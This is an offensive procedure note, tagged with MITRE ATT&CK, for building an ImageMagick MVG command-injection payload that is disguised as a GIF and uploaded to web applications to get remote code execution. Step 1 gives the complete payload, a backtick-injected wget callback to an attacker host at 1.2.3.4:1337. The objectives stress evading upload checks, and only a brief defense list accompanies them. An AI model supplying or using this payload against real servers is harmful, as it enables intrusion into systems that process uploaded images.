---
tags:
  - rce
  - mvg
  - payload-creation
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T05:32:13.344Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 41607bc7-d491-4dec-9432-953ed968046d
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Prepare-Malicious-MVG-Payload-File

## Summary

This procedure involves crafting an ASCII text file containing Magick Vector Graphics (MVG) directives that exploit ImageMagick's parsing to inject commands via an HTTPS URL delegate, disguised as a GIF image for upload.

## Description

In scenarios where a web application processes uploaded images with ImageMagick without proper validation, attackers can upload ASCII files that ImageMagick interprets as MVG. The payload uses the 'image over' composite operation with a URL containing backticks for command injection, targeting the vulnerable curl invocation in delegates.xml. This step prepares the file for upload, enabling subsequent RCE.

## Requirements

1. Text editor (e.g., vim, nano) on attacker machine
2. Knowledge of target IP/port for callback (e.g., 1.2.3.4:1337)
3. Basic understanding of MVG syntax

## Defense

Defensive measures and detection strategies:

- Validate uploaded files with magic bytes or libraries like libmagic
- Disable MVG parsing in ImageMagick policy.xml
- Scan uploads for suspicious ASCII content

## Objectives

1. Create a valid MVG payload embedding command injection
2. Disguise as image to evade basic checks
3. Ensure payload triggers on server-side processing

## Instructions

### Step 1: Craft the MVG Payload

**Context**: Write the MVG code to set up a graphic context and overlay an image from a malicious HTTPS URL that injects the command.

No command executed here; use text editor:

Create file x.gif with content:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```

> This sets a viewbox and uses 'image over' to fetch from a URL with backticks executing the wget command via bash in the curl delegate.

### Step 2: Verify Payload Syntax

**Context**: Manually check the file to ensure no formatting errors that could prevent parsing.

Use cat or echo to inspect:

```bash
echo "$(cat x.gif)" | head -5
```

> Expected output: Displays the MVG lines correctly, confirming the injection string is intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ImageMagick]]

## Tags

- rce
- mvg
